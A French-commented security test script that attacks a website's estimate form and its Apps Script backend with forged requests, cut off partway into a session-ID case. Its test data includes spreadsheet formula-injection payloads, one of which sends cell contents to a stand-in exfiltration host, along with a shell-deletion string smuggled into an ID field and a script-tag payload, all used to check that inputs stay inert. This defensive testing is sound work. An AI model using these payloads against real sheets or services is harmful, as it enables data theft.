/* ============================================================
   L'ATTAQUE DE L'ESTIMATEUR — `node tools/estimateur-attaque.mjs`

   CE QU'IL CHERCHE. Pas la preuve que le parcours dessiné marche —
   `estimateur-check.mjs` s'en charge en 119 cas, et
   `retro-estim.mjs` attaque la GRILLE. Celui-ci cherche ce qui
   CASSE : le pouce nerveux qui clique deux fois, le `required`
   retiré à la console, les dix mille signes collés depuis un
   courriel, la formule glissée dans un nom, la requête fabriquée à
   la main qui n'a jamais vu le formulaire — et le montant qu'on
   essaie d'écrire soi-même dans le classeur.

   ------------------------------------------------------------
   TROIS DÉFAUTS RÉELS TROUVÉS PAR CET OUTIL, ET CORRIGÉS

   1 · LA BORNE DE « FONCTIONS » COUPAIT UN CHEMIN COMPLET.
       `LONGUEURS.fonctions` valait 160 signes. Les cinq cases du
       chemin « outil de soumission ou de calcul » font 171 signes
       une fois jointes par `serialize()`. Quelqu'un qui coche tout
       — c'est-à-dire le plus gros projet du type, donc le meilleur
       lead — remplissait ses six écrans, cliquait « Voir ma
       fourchette », et lisait « La réponse « Fonctions » est trop
       longue ». Il ne pouvait rien corriger : ce ne sont pas des
       champs de texte, ce sont des cases, et rien à l'écran ne
       disait laquelle décocher. Aucune ligne au classeur, aucun
       courriel, le lead perdu. Corrigé dans `google/Code.gs` :
       la borne passe à 400, soit plus du double de la plus longue
       combinaison possible.

   2 · UNE FONCTION RÉPÉTÉE GONFLAIT LE TOTAL.
       `estimTotal` additionnait `fonctions` telle qu'elle arrive.
       Sept fois « Le paiement en ligne » (152 signes, donc sous la
       borne) faisait passer une boutique de « 13 000 $ à 18 000 $ »
       à « 24 000 $ à 32 000 $ ». Le navigateur ne peut pas produire
       ça — une case cochée deux fois n'existe pas — mais une requête
       forgée, oui, et le montant se gravait dans une colonne FIGÉE.
       Corrigé : `estimListe()` dédoublonne.

   3 · `_form: "constructor"` TRAVERSAIT LE GARDE.
       `!SCHEMA[kind]` interroge la chaîne de prototypes :
       `SCHEMA["constructor"]`, `SCHEMA["toString"]`,
       `SCHEMA["hasOwnProperty"]` rendent tous une fonction, donc
       « vrai ». Le refus propre « Formulaire inconnu. » ne se
       déclenchait pas ; `valider()` levait trois lignes plus bas et
       le visiteur lisait « Le service a rencontré une erreur »,
       avec une trace d'exception dans le journal Apps Script à
       chaque requête. Corrigé : `hasOwnProperty.call`.

   4 · LA RÉPONSE DU VISITEUR PRÉCÉDENT SURVIVAIT À `resetEstimate`.
       `#esPrixRaison` — « qu'est-ce qui accroche ? » — vit dans
       l'écran 14, DEHORS du `<form>` de l'écran 13. `form.reset()`
       ne le touchait donc pas, et `resetEstimate()` ne le nommait
       pas. Rouvrir la modale gardait la phrase du visiteur
       précédent dans le champ ; le suivant qui clique « Non »
       l'envoyait sous son propre nom. Corrigé dans `js/main.js`.

   ------------------------------------------------------------
   TROIS RÈGLES DE FABRICATION, ET ELLES VIENNENT DE `CLAUDE.md` :

   1 · CHAQUE REFUS A SON TÉMOIN POSITIF. Un « le serveur refuse »
       ne vaut rien tant qu'on n'a pas montré que le MÊME envoi,
       corrigé sur le seul point attaqué, PASSE. Sans ça, une faute
       de frappe dans la charge utile se lit comme une défense.

   2 · UN OUTIL QUI REND « 0 » SANS ERREUR MENT. Toute sonde qui ne
       trouve rien prouve d'abord qu'elle sait trouver quelque
       chose : les cibles au pouce ARRÊTENT l'outil si elles
       mesurent toutes zéro, le contrôle des formules commence par
       en écrire une vraie et vérifier que le banc la voit, et le
       détecteur de troncature commence par regarder un bloc qu'on
       a tronqué exprès.

   3 · UN TEST PEUT VERROUILLER LE DÉFAUT. Les trois gardes qui
       comptent le plus sont rejouées DÉSARMÉES, et elles doivent
       alors tomber.

   LE DÉSARMEMENT DU SERVEUR NE TOUCHE PAS LE DÉPÔT, ET C'EST
   DÉLIBÉRÉ. `reference-attaque.mjs` écrit dans `google/Code.gs`
   puis restaure — et refuse de le faire si le fichier porte des
   modifications non validées. Cette prudence-là se retourne contre
   nous ici : la session qui CORRIGE les défauts laisse justement
   `Code.gs` modifié, donc la passe qui compte le plus se sauterait
   toute seule, en silence, exactement le jour où elle sert. On lit
   donc le source, on le patche EN MÉMOIRE, et on l'évalue dans une
   seconde instance qui partage `etat`. Le disque n'est jamais
   ouvert en écriture ; l'empreinte sha256 est relevée avant et
   après pour le prouver, et l'état git est rapporté sans jamais
   servir de raison de ne pas mesurer.

   LE FAUX GOOGLE ET LE SITE SONT À MOI. L'outil lance ses propres
   instances sur des ports libres : l'état doit repartir de zéro
   entre deux cas, et `getFormulas()` ne se lit que depuis le même
   processus.

   RÉSERVE, ET ELLE VAUT POUR TOUT LE FICHIER : Chromium sous
   Playwright, machine de bureau Windows. Les relevés en 320 et
   390 px de large ne viennent PAS d'un appareil réel.

   Sorties : 0 tout tient · 1 défaut · 2 l'instrument a dérivé.
   ============================================================ */
import { chromium } from "playwright";
import fs from "node:fs";
import http from "node:http";
import path from "node:path";
import crypto from "node:crypto";
import { execFileSync } from "node:child_process";
import { fileURLToPath, pathToFileURL } from "node:url";

const ICI = path.dirname(fileURLToPath(import.meta.url));
const RACINE = path.resolve(ICI, "..");
const SORTIE = path.join(RACINE, "preuves", "estimateur-attaque");
fs.mkdirSync(SORTIE, { recursive: true });

/* ============================================================
   L'INSTRUMENT

   `arret()` sort en 2, jamais en 1. Un instrument qui a dérivé ne
   rend AUCUN verdict : il ne dit ni « ça tient » ni « ça casse »,
   il dit qu'il n'a pas su regarder.
   ============================================================ */
let n = 0, ko = 0;
const echecs = [];
function dire(nom, obtenu, attendu, note2) {
  n++;
  const ok = String(obtenu) === String(attendu);
  if (!ok) { ko++; echecs.push(nom); }
  console.log("  " + (ok ? "OK   " : "ECHEC") + " " + nom
    + (ok ? "" : "\n         obtenu  : " + JSON.stringify(obtenu)
             + "\n         attendu : " + JSON.stringify(attendu)
             + (note2 ? "\n         " + note2 : "")));
}
function titre(t) { console.log(""); console.log("--- " + t); }
function note(t) { console.log("       · " + t); }
function arret(pourquoi) {
  console.error("");
  console.error("ARRET — L'INSTRUMENT A DERIVE : " + pourquoi);
  console.error("Aucun verdict n'est rendu.");
  process.exit(2);
}

/* ============================================================
   LE BANC — le VRAI `Code.gs`, sur un port à moi
   ============================================================ */
const fauxUrl = pathToFileURL(path.join(ICI, "faux-google.mjs")).href;
const { gs, etat, services, servir } = await import(fauxUrl);

const srvG = servir(0);
await new Promise((r) => srvG.once("listening", r));
const PORT_G = srvG.address().port;
const GOOGLE = "http://127.0.0.1:" + PORT_G + "/exec";
const ONGLET = gs.SCHEMA.estimate.onglet;

/* Toutes les réponses du service passent par ici : le contrôle de
   fuite de la grille (cas 16) les relit toutes à la fin. */
const REPONSES = [];

function remise() {
  etat.feuilles.clear();
  etat.courriels.length = 0;
  etat.proprietes = {};
  /* LE CACHE AUSSI, ET C'EST LUI QU'ON OUBLIE. `tropVite` y compte
     les envois : sans remise, le plafond de débit d'un cas ferme
     tous les suivants et l'outil accuse le site. */
  etat.cache = {};
  etat.quota = 100;
  etat.decalageHorloge = 0;
  gs.initialiser();
}
function feuille() { return etat.feuilles.get(ONGLET); }
function nbLignes() {
  const f = feuille();
  if (!f) return 0;
  return f.valeurs.slice(1).filter((r) => r.some((c) => c !== "" && c != null)).length;
}
function colonne(t) {
  const f = feuille();
  return f ? f.valeurs[0].indexOf(t) : -1;
}
function valeur(ligne, t) {
  const i = colonne(t);
  if (i < 0) return "__COLONNE ABSENTE__";
  const r = (feuille().valeurs[ligne - 1]) || [];
  return String(r[i] == null ? "" : r[i]);
}
/* CE QUE SHEETS A RETENU COMME CALCUL, et rien d'autre.
   `getValues()` rend « =1+1 » SANS son apostrophe : la valeur
   rangée ne peut donc pas distinguer un texte inerte d'une
   formule. Seul `formules` le dit — c'est `getFormulas()`. */
function cellulesCalculees() {
  const f = feuille();
  return f ? f.formules.size : -1;
}
/* La ligne d'un courriel donné, quel que soit son rang. */
function ligneDe(courriel) {
  const f = feuille();
  if (!f) return 0;
  const i = f.valeurs[0].indexOf("Courriel");
  for (let l = 1; l < f.valeurs.length; l++) {
    if (String(f.valeurs[l][i] || "") === courriel) return l + 1;
  }
  return 0;
}

async function forge(charge) {
  const res = await fetch(GOOGLE, {
    method: "POST",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify(charge)
  });
  const texte = await res.text();
  REPONSES.push({ ou: "POST", corps: texte });
  try { return JSON.parse(texte); }
  catch (e) { return { success: false, message: "corps illisible : " + texte.slice(0, 120) }; }
}
/* Un `_sid` valide et REPRODUCTIBLE. Ni `Math.random` ni `Date.now`
   n'entrent dans ce qui décide d'un verdict : un verdict qui change
   d'un lancement à l'autre n'est pas un verdict. */
const sidDe = (nom) => ("ZZTEST" + nom + "0123456789abcdefghij")
  .replace(/[^A-Za-z0-9_-]/g, "").slice(0, 24);

/* LES CINQ LIBELLÉS DE CHAQUE TYPE, RECOPIÉS DEPUIS LA GRILLE ET
   PAS DEPUIS `index.html`. Un chemin qui coche tout est le plus
   gros projet du type : c'est celui qui doit passer, et c'est
   celui qui cassait. */
const TOUTES = {
  vitrine: Object.keys(gs.ESTIM_GRILLE.vitrine.fonctions),
  boutique: Object.keys(gs.ESTIM_GRILLE.boutique.fonctions),
  estimateur: Object.keys(gs.ESTIM_GRILLE.estimateur.fonctions),
  logiciel: Object.keys(gs.ESTIM_GRILLE.logiciel.fonctions)
};

/* Le jeu complet d'une estimation valide, moins ce que chaque cas
   retire. C'est LUI le témoin positif de tous les refus forgés. */
function estimation(sid, extra) {
  return Object.assign({
    _form: "estimate", _sid: sidDe(sid), _etape: 6, _etapes: 7, _final: true,
    _subject: "Demande d'estimation - site APED",
    nom: "ZZTEST Attaque", email: "zz-attaque@exemple.ca", telephone: "418 555 0142",
    type_de_projet: "Une boutique en ligne",
    ampleur: "25 à 250 produits",
    fonctions: "Le paiement en ligne, Le calcul de la livraison",
    niveau_design: "Propre et rapide",
    contenu: "J’en ai une partie",
    echeancier: "Dans 1 à 3 mois",
    taille_equipe: "1 à 5 personnes"
  }, extra || {});
}

/* ============================================================
   LE SITE — servi par moi, sur un port à moi
   ============================================================ */
const MIME = { ".html": "text/html", ".css": "text/css", ".js": "text/javascript",
  ".svg": "image/svg+xml", ".woff2": "font/woff2", ".png": "image/png",
  ".jpg": "image/jpeg", ".webp": "image/webp", ".avif": "image/avif",
  ".pdf": "application/pdf", ".json": "application/json" };
const srvSite = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split("?")[0]);
  if (p === "/") p = "/index.html";
  const f = path.join(RACINE, p);
  if (!f.startsWith(RACINE) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) {
    res.writeHead(404); res.end("non"); return;
  }
  res.writeHead(200, { "Content-Type": MIME[path.extname(f)] || "application/octet-stream" });
  fs.createReadStream(f).pipe(res);
});
await new Promise((r) => srvSite.listen(0, r));
const BASE = "http://127.0.0.1:" + srvSite.address().port;

console.log("============================================================");
console.log("L'ATTAQUE DE L'ESTIMATEUR");
console.log("  site    : " + BASE + "   (instance privée)");
console.log("  service : " + GOOGLE + "   (instance privée, remise à zéro entre les cas)");
console.log("  onglet  : « " + ONGLET + " »");
console.log("============================================================");

/* ============================================================
   0 · AUTO-CONTRÔLE — les sondes savent-elles voir ?

   Un outil qui rend « 0 défaut » sans savoir échouer ne prouve
   rien. Chaque famille commence par un témoin positif ; ceux-ci
   valent pour tout le fichier.
   ============================================================ */
console.log("");
console.log("############################################################");
console.log("PARTIE 0 · AUTO-CONTRÔLE DES SONDES");
console.log("############################################################");

const MONTANT = /\d[\d\s  ]*\$/;

titre("0a · LE DÉTECTEUR DE MONTANT");
dire("il reconnaît « 13 000 $ »", MONTANT.test("13 000 $"), true);
dire("il reconnaît « 6 000 $ » à l'espace ordinaire", MONTANT.test("6 000 $"), true);
dire("il ne prend pas un texte sans chiffre pour un prix", MONTANT.test("Propre et rapide"), false);

titre("0b · LE BANC VOIT-IL UNE VRAIE FORMULE ?");
{
  /* Un `getFormulas()` qui rend toujours vide ferait passer
     n'importe quel poison pour du texte inerte — c'est exactement
     la panne qui a laissé croire pendant des mois que D-731
     tenait. On en écrit une VRAIE, par une vraie plage. */
  remise();
  const f = services.SpreadsheetApp.openById("X").getSheetByName(ONGLET);
  f.getRange(3, 1, 1, 1).setValues([["=1+1"]]);
  const vue = f.getRange(3, 1, 1, 1).getFormulas()[0][0];
  dire("TÉMOIN D'INSTRUMENT · le banc VOIT une formule qu'on vient d'écrire", vue, "=1+1");
  if (vue !== "=1+1") arret("`getFormulas()` du banc ne voit pas une formule écrite à la main.");
  dire("… et il la compte", cellulesCalculees() > 0, true);
}

titre("0c · LE SERVICE ET LE SITE RÉPONDENT");
{
  remise();
  const t = await forge(estimation("temoin0"));
  dire("le jeu complet PASSE", t.success, true, t.message || "");
  dire("… et il rend une fourchette", MONTANT.test((t.fourchette || {}).texte || ""), true,
    JSON.stringify(t.fourchette));
  dire("… et elle est écrite au classeur", valeur(2, "Fourchette vue"), (t.fourchette || {}).texte);
  if (!t.success) arret("le témoin de référence ne passe pas : tout le reste mesurerait à vide.");

  try {
    const r = await fetch(BASE + "/index.html");
    if (!r.ok) arret("le site répond " + r.status + " sur " + BASE);
    dire("le site répond", r.status, 200);
  } catch (e) { arret("le site ne répond pas sur " + BASE + " (" + e.message + ")"); }
}

/* ============================================================
   PARTIE I — PAR REQUÊTE FORGÉE (aucun navigateur)

   Celui qui fabrique une requête ne voit jamais le formulaire : ni
   les quatorze écrans, ni le champ piège, ni le `maxlength`. Tout
   ce que le navigateur garantit est ici remis à zéro.
   ============================================================ */
console.log("");
console.log("############################################################");
console.log("PARTIE I · PAR REQUÊTE FORGÉE");
console.log("############################################################");

/* ------------------------------------------------------------
   1 · LE MONTANT QU'ON S'ÉCRIT SOI-MÊME
   ------------------------------------------------------------ */
titre("1 · `fourchette_vue` FABRIQUÉ DANS LA CHARGE");
{
  remise();
  const r = await forge(estimation("vueForgee", { fourchette_vue: "1 $ à 2 $" }));
  dire("l'envoi passe — on n'attaque pas la validité", r.success, true, r.message || "");
  dire("la réponse porte la fourchette du SERVEUR", (r.fourchette || {}).texte, "13 000 $ à 18 000 $");
  dire("la colonne aussi", valeur(2, "Fourchette vue"), "13 000 $ à 18 000 $",
    "la colonne est FIGÉE : un montant faux gravé ici ne se corrige plus jamais");
  dire("le montant forgé n'apparaît nulle part dans la ligne",
    feuille().valeurs[1].some((c) => String(c).indexOf("1 $ à 2 $") !== -1), false);
}

titre("2 · LES CHAMPS DE SERVICE FORGÉS");
{
  remise();
  const INTRUS = {
    "Étape": "✓ complète", "Horodatage": "1999-01-01 00:00:00",
    "Signature": "S:falsifiee", "Statut": "Client", "Renvois": "99",
    "Lu par": "Personne", "Rappelé par": "Personne", "Notes internes": "payé, ne pas rappeler",
    "Parti vers": "Réservation", "_conditions_le": "1990-01-01 00:00:00",
    _parti_vers: "inventé", statut: "Client", signature: "y"
  };
  const r = await forge(estimation("intrus", INTRUS));
  dire("l'envoi passe", r.success, true, r.message || "");
  dire("« Statut » n'est pas « Client »", valeur(2, "Statut"), "Nouveau");
  dire("« Renvois » n'est pas 99", valeur(2, "Renvois"), "0");
  dire("« Notes internes » reste vide", valeur(2, "Notes internes"), "");
  dire("« Lu par » reste vide", valeur(2, "Lu par"), "");
  dire("« Signature » est celle du serveur",
    valeur(2, "Signature"), "S:" + sidDe("intrus"));
  dire("« Horodatage » n'est pas 1999", String(valeur(2, "Horodatage")).indexOf("1999"), -1,
    "lu : " + valeur(2, "Horodatage"));
  dire("« Parti vers » n'obéit pas à un vocabulaire inventé", valeur(2, "Parti vers"), "");
  /* TÉMOIN POSITIF. Sans lui, « rien n'a atteint les colonnes »
     pourrait simplement vouloir dire que rien n'a été écrit. */
  dire("TÉMOIN · un champ connu atteint bien sa colonne", valeur(2, "Nom"), "ZZTEST Attaque");
  dire("TÉMOIN · et un second aussi", valeur(2, "Ampleur"), "25 à 250 produits");
}

/* ------------------------------------------------------------
   3 · UNE RÉPONSE QUE LA GRILLE NE CONNAÎT PAS

   La règle est écrite dans `estimTotal` : « il refuse plutôt que
   de deviner ». Un zéro silencieux donnerait une fourchette
   calculée sur une réponse perdue, et personne ne le verrait.
   ------------------------------------------------------------ */
titre("3 · UN TYPE, UNE AMPLEUR, UNE FONCTION QUI N'EXISTENT PAS");
{
  const CAS = [
    ["un type inventé", { type_de_projet: "Un vaisseau spatial" }],
    ["une ampleur d'un AUTRE type", {
      type_de_projet: "Un logiciel ou une application sur mesure",
      ampleur: "25 à 250 produits", fonctions: "", usagers: "Mon équipe", contenu: "" }],
    ["une fonction d'un AUTRE type", {
      fonctions: "Une application mobile" }],
    ["un échéancier inventé", { echeancier: "Hier" }],
    ["une taille d'équipe inventée", { taille_equipe: "Douze" }],
    ["un niveau visuel inventé", { niveau_design: "Somptueux" }]
  ];
  for (const [quoi, extra] of CAS) {
    remise();
    const r = await forge(estimation("nul" + quoi.length, extra));
    dire(quoi + " · l'envoi passe quand même", r.success, true, r.message || "");
    dire(quoi + " · AUCUNE fourchette n'est rendue", r.fourchette === undefined, true,
      JSON.stringify(r.fourchette) + " — mieux vaut rien qu'un montant faux");
    dire(quoi + " · et la colonne reste vide", valeur(2, "Fourchette vue"), "");
  }

  /* TÉMOIN : le MÊME envoi, corrigé sur le seul point attaqué. */
  remise();
  const bon = await forge(estimation("nulTemoin"));
  dire("TÉMOIN · le même envoi avec des libellés connus rend un montant",
    MONTANT.test((bon.fourchette || {}).texte || ""), true, JSON.stringify(bon.fourchette));
}

/* ------------------------------------------------------------
   4 · LA MÊME FONCTION VINGT FOIS

   Le navigateur ne peut pas produire ça — une case cochée deux
   fois n'existe pas. Une requête forgée, oui. Le total ne doit
   pas bouger : sinon un montant faux se grave dans une colonne
   FIGÉE, et « ce que le visiteur a vu » devient un mensonge.
   ------------------------------------------------------------ */
titre("4 · LA MÊME FONCTION RÉPÉTÉE");
{
  remise();
  const seule = await forge(estimation("rep1", { fonctions: "Le paiement en ligne" }));
  const attendu = (seule.fourchette || {}).texte;
  dire("TÉMOIN · une seule fois rend un montant", MONTANT.test(attendu || ""), true, String(attendu));

  /* SEPT FOIS TIENT SOUS LA BORNE DE LONGUEUR, et c'est ce qui
     rend le cas intéressant : le refus ne peut pas venir d'ailleurs. */
  remise();
  const sept = "Le paiement en ligne, ".repeat(7).replace(/, $/, "");
  dire("sept répétitions tiennent sous la borne de longueur",
    sept.length <= gs.SCHEMA.estimate.champs.length * 0 + 160, true, sept.length + " signes");
  const r7 = await forge(estimation("rep7", { fonctions: sept }));
  dire("sept fois : l'envoi passe", r7.success, true, r7.message || "");
  dire("sept fois : le montant est le MÊME qu'une fois",
    (r7.fourchette || {}).texte, attendu,
    "sinon un forgeron gonfle sa propre fourchette, et elle se grave dans une colonne figée");

  remise();
  const vingt = "Le paiement en ligne, ".repeat(20).replace(/, $/, "");
  const r20 = await forge(estimation("rep20", { fonctions: vingt }));
  dire("vingt fois (438 signes) : refusé sur la LONGUEUR", r20.success, false, r20.message);
  dire("… et le refus nomme le champ", /« Fonctions »/.test(String(r20.message)), true, r20.message);
  dire("… et aucune ligne n'est née", nbLignes(), 0);
}

titre("5 · « RIEN DE TOUT ÇA » MÊLÉ À DE VRAIES FONCTIONS");
{
  remise();
  const seule = await forge(estimation("rien1", { fonctions: "Le paiement en ligne" }));
  remise();
  const melange = await forge(estimation("rienMix", {
    fonctions: "Rien de tout ça, Le paiement en ligne" }));
  dire("l'envoi passe", melange.success, true, melange.message || "");
  dire("« Rien de tout ça » ne compte pas comme une fonction",
    (melange.fourchette || {}).texte, (seule.fourchette || {}).texte,
    "sinon l'économie de lot se déclenche sur une case qui ne coûte rien");
  dire("et la valeur part quand même au classeur, telle quelle",
    valeur(2, "Fonctions"), "Rien de tout ça, Le paiement en ligne");
}

/* ------------------------------------------------------------
   6 · LE CHEMIN QUI COCHE TOUT — LE DÉFAUT N° 1

   Cinq cases sur le chemin « outil de soumission ou de calcul »
   font 171 signes une fois jointes. La borne était à 160.
   ------------------------------------------------------------ */
titre("6 · LES CINQ CASES DE CHAQUE TYPE, COCHÉES ENSEMBLE");
{
  const JEUX = {
    vitrine: { type_de_projet: "Un site pour présenter mon entreprise",
               ampleur: "Plus de 15 pages", contenu: "Tout est à faire" },
    boutique: { type_de_projet: "Une boutique en ligne",
                ampleur: "Moins de 25 produits", contenu: "Mes textes et mes photos sont prêts" },
    estimateur: { type_de_projet: "Un outil de soumission ou de calcul",
                  ampleur: "Un prix", contenu: "", complexite: "Quelques options" },
    logiciel: { type_de_projet: "Un logiciel ou une application sur mesure",
                ampleur: "Moins de 5 écrans", contenu: "", usagers: "Mon équipe" }
  };
  for (const cle of Object.keys(TOUTES)) {
    const jointes = TOUTES[cle].join(", ");
    remise();
    const r = await forge(estimation("tout" + cle,
      Object.assign({ fonctions: jointes }, JEUX[cle])));
    dire(cle + " · les cinq cases passent (" + jointes.length + " signes)",
      r.success, true, r.message || "");
    dire(cle + " · et une fourchette est rendue",
      MONTANT.test((r.fourchette || {}).texte || "") || !!(r.fourchette || {}).horsEchelle, true,
      JSON.stringify(r.fourchette));
  }
  note("la plus longue combinaison possible : "
    + Math.max(...Object.keys(TOUTES).map((k) => TOUTES[k].join(", ").length))
    + " signes · borne du serveur : " + 400);
}

titre("7 · UN ENVOI SANS `_final`, AVEC `prix_reaction` SEUL");
{
  remise();
  const r = await forge({
    _form: "estimate", _sid: sidDe("reacSeule"), _etape: 99, _etapes: 99,
    email: "zz-reaction@exemple.ca", prix_reaction: "Non", prix_raison: "trop cher",
    type_de_projet: "Une boutique en ligne", ampleur: "25 à 250 produits",
    fonctions: "", niveau_design: "Propre et rapide",
    contenu: "Tout est à faire", echeancier: "Dans le mois", taille_equipe: "26 personnes et plus"
  });
  dire("l'envoi passe — c'est la sauvegarde progressive (D-744)", r.success, true, r.message || "");
  dire("une ligne naît", nbLignes(), 1);
  dire("elle porte le courriel, seul minimum vital exigé",
    valeur(2, "Courriel"), "zz-reaction@exemple.ca");
  note("une ligne sans nom ni téléphone est VOULUE : `requisPartiel` n'exige que le courriel, "
    + "sinon on perdrait l'abandon qu'on cherche justement à capter");
  dire("et la fourchette est celle que le SERVEUR recalcule",
    valeur(2, "Fourchette vue"), "18 000 $ à 24 000 $");

  /* SANS `_sid` NI `_final`, rien n'est partiel : le jeu complet
     est exigé, et une ligne anonyme ne peut pas naître. */
  remise();
  const nu = await forge({
    _form: "estimate", email: "zz-nu@exemple.ca", prix_reaction: "Non",
    type_de_projet: "Une boutique en ligne"
  });
  dire("sans `_sid` : le jeu complet est exigé", nu.success, false, nu.message);
  dire("… et aucune ligne ne naît", nbLignes(), 0);
}

titre("8 · LES CHAMPS DÉMESURÉS");
{
  const CAS = [
    ["besoin_detail à 50 000", { besoin_detail: "A".repeat(50000) }, "Ce qu'il veut faire", 3000],
    ["nom à 10 000", { nom: "N".repeat(10000) }, "Nom", 120],
    ["prix_raison à 100 000", { prix_raison: "R".repeat(100000) }, "Pourquoi pas", 2000],
    ["email à 300", { email: "z".repeat(290) + "@exemple.ca" }, "Courriel", 254]
  ];
  for (const [quoi, extra, lisible, borne] of CAS) {
    remise();
    const r = await forge(estimation("long" + borne, extra));
    dire(quoi + " · refusé", r.success, false, r.message);
    dire(quoi + " · le refus nomme le champ ET sa borne",
      new RegExp("« " + lisible.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + " ».+" + borne)
        .test(String(r.message)), true, "« " + r.message + " »");
    dire(quoi + " · aucune ligne n'est née", nbLignes(), 0);
  }

  /* TÉMOIN : un texte DANS la borne passe. Sans lui, on aurait pu
     casser le champ au lieu de le borner. */
  remise();
  const ok = await forge(estimation("longOk", { besoin_detail: "A".repeat(2900) }));
  dire("TÉMOIN · 2 900 signes dans `besoin_detail` passent", ok.success, true, ok.message || "");
  dire("… et ils arrivent entiers", valeur(2, "Ce qu'il veut faire").length, 2900);
}

/* ------------------------------------------------------------
   9 · L'INJECTION DE FORMULE

   `setValues` avec « =IMPORTXML(…) » ne range pas du texte : Sheets
   en fait une FORMULE, et elle part sous le compte de l'agence à
   chaque ouverture du classeur. C'est `texteInerte()` qui protège,
   pas le format `@` — mesuré, pas supposé (D-757, piège 93).
   ------------------------------------------------------------ */
titre("9 · UNE FORMULE DANS CHAQUE CHAMP DE TEXTE");
{
  remise();
  const POISONS = {
    nom: '=IMPORTXML("https://exfil.example/?"&B2,"//a")',
    email: "zz-poison@exemple.ca",
    telephone: "+1 418 555 0142",
    type_de_projet: "-cmd",
    ampleur: "@import",
    fonctions: "=1+1",
    niveau_design: "+41255",
    contenu: "@SUM(A1:A9)",
    complexite: "-2-2",
    usagers: '=HYPERLINK("https://x","clic")',
    besoin_detail: "=IMAGE(\"https://x/pix.png\")",
    echeancier: "+1+1",
    taille_equipe: "@ADRESSE",
    prix_reaction: "-cmd",
    prix_raison: '=IMPORTDATA("https://x")'
  };
  const r = await forge(estimation("poison", POISONS));
  dire("l'envoi passe — on ne refuse pas le client", r.success, true, r.message || "");
  dire("AUCUNE cellule n'est un calcul", cellulesCalculees(), 0,
    "cellules : " + [...feuille().formules].join(", "));

  /* LE TEXTE EST RANGÉ, PAS MUTILÉ. Sheets mange l'apostrophe de
     tête à l'enregistrement : la valeur relue doit être la chaîne
     d'ORIGINE. Une valeur amputée de son « = » prouverait qu'on a
     abîmé la réponse du visiteur au lieu de la ranger. */
  dire("le nom est intact", valeur(2, "Nom"), POISONS.nom);
  dire("« -cmd » est intact", valeur(2, "Type de projet"), "-cmd");
  dire("« @import » est intact", valeur(2, "Ampleur"), "@import");
  dire("« =1+1 » est intact", valeur(2, "Fonctions"), "=1+1");
  dire("« +41255 » est intact", valeur(2, "Niveau visuel"), "+41255");
  dire("« @SUM(A1:A9) » est intact", valeur(2, "Contenu"), "@SUM(A1:A9)");
  dire("« =IMPORTDATA » est intact", valeur(2, "Pourquoi pas"), POISONS.prix_raison);

  /* LA SECONDE ÉCRITURE NE DOIT PAS RALLUMER LE POISON.
     `getValues()` rend la forme NUE : une étape suivante qui touche
     n'importe quel AUTRE champ réécrit la ligne entière, et Sheets
     recalcule ce qu'il relit. (D-761) */
  const r2 = await forge({
    _form: "estimate", _sid: sidDe("poison"), _etape: 99, _etapes: 99,
    email: "zz-poison@exemple.ca", prix_reaction: "Oui"
  });
  dire("une seconde étape passe", r2.success, true, r2.message || "");
  dire("… et elle a bien touché la ligne", valeur(2, "Ça convient ?"), "Oui",
    "sans modification, `fusionnerLigne` ne réécrit rien et le cas ne prouverait rien");
  dire("APRÈS FUSION, toujours aucun calcul", cellulesCalculees(), 0,
    "cellules rallumées : " + [...feuille().formules].join(", "));
  dire("et le poison est toujours lisible tel quel", valeur(2, "Nom"), POISONS.nom);
  dire("une seule ligne, toujours", nbLignes(), 1);
}

titre("10 · CARACTÈRES DE CONTRÔLE, RTL, ÉMOJIS, HTML");
{
  remise();
  const TORDU = " nul ‮elive‬ 😀🔧 <script>alert(1)</script> </td><td>x "
    + "«guillemets» — éèêç \\back\\ ;;; [31m";
  const r = await forge(estimation("tordu", { besoin_detail: TORDU, nom: "ZZ " + TORDU.slice(0, 60) }));
  dire("l'envoi passe", r.success, true, r.message || "");
  dire("le texte arrive au classeur EXACTEMENT tel qu'envoyé",
    valeur(2, "Ce qu'il veut faire"), TORDU,
    "c'est au classeur de rendre le texte inerte, pas au service de mutiler ce qu'on écrit");
  dire("aucune cellule n'est devenue un calcul", cellulesCalculees(), 0);
  dire("une seule ligne", nbLignes(), 1);
}

titre("11 · LE PIÈGE À ROBOTS");
{
  remise();
  const r = await forge(estimation("piege", { _gotcha: "https://spam.example" }));
  dire("la réponse dit « succès » — on ne prévient pas le robot", r.success, true);
  dire("… et elle marque l'abandon", r.ignore, true, JSON.stringify(r));
  dire("AUCUNE ligne n'est née", nbLignes(), 0);
  dire("AUCUN courriel n'est parti", etat.courriels.length, 0);

  /* TÉMOIN : le même envoi, piège vide, écrit bien une ligne. */
  remise();
  const bon = await forge(estimation("piegeOk", { _gotcha: "" }));
  dire("TÉMOIN · le piège vide laisse passer", bon.success, true);
  dire("… et une ligne naît", nbLignes(), 1);
}

titre("12 · L'IDENTIFIANT DE SESSION");
{
  remise();
  const MAUVAIS = [
    ["de 3 signes", "abc"],
    ["avec des signes interdits", "abc/def;rm -rf/"],
    ["de 40 000 signes", "a".repeat(40000)],
    ["qui commence par « = »", "=1+1abcdefgh"],
    ["entouré d'espaces", "  abcdefghij  "],
    ["avec un saut de ligne", "abcdefgh\nij"],
    ["avec un point", "abcdefgh.ij"]
  ];
  for (const [quoi, sid] of MAUVAIS) {
    const r = await forge(estimation("x", { _sid: sid }));
    dire("`_sid` " + quoi + " : refusé", r.success, false, r.message);
  }
  dire("… et il n'a JAMAIS servi de clé de cache",
    Object.keys(etat.cache).some((k) => k.length > 200), false,
    "un `_sid` non validé finirait dans `CacheService` avant d'être jugé");
  dire("aucune ligne n'est née", nbLignes(), 0);

  const bon = await forge(estimation("sidOk"));
  dire("TÉMOIN · un `_sid` de 24 signes passe", bon.success, true, bon.message || "");
  dire("… et il ouvre bien une ligne", nbLignes(), 1);
}

/* ------------------------------------------------------------
   12bis · LE `_sid` D'UNE AUTRE PERSONNE

   IL N'EST NI SIGNÉ NI LIÉ À PERSONNE, et c'est une réserve
   ASSUMÉE du dépôt (`RESERVES.md`) : connaître un `_sid` permet
   d'ÉCRIRE dans la ligne correspondante, jamais de la LIRE. Ce cas
   ne prétend donc pas que la porte est fermée — il mesure
   exactement ce qui passe et ce qui ne passe pas, pour qu'une
   régression se voie.
   ------------------------------------------------------------ */
titre("12bis · UNE REQUÊTE QUI EMPRUNTE LE `_sid` D'UN AUTRE");
{
  remise();
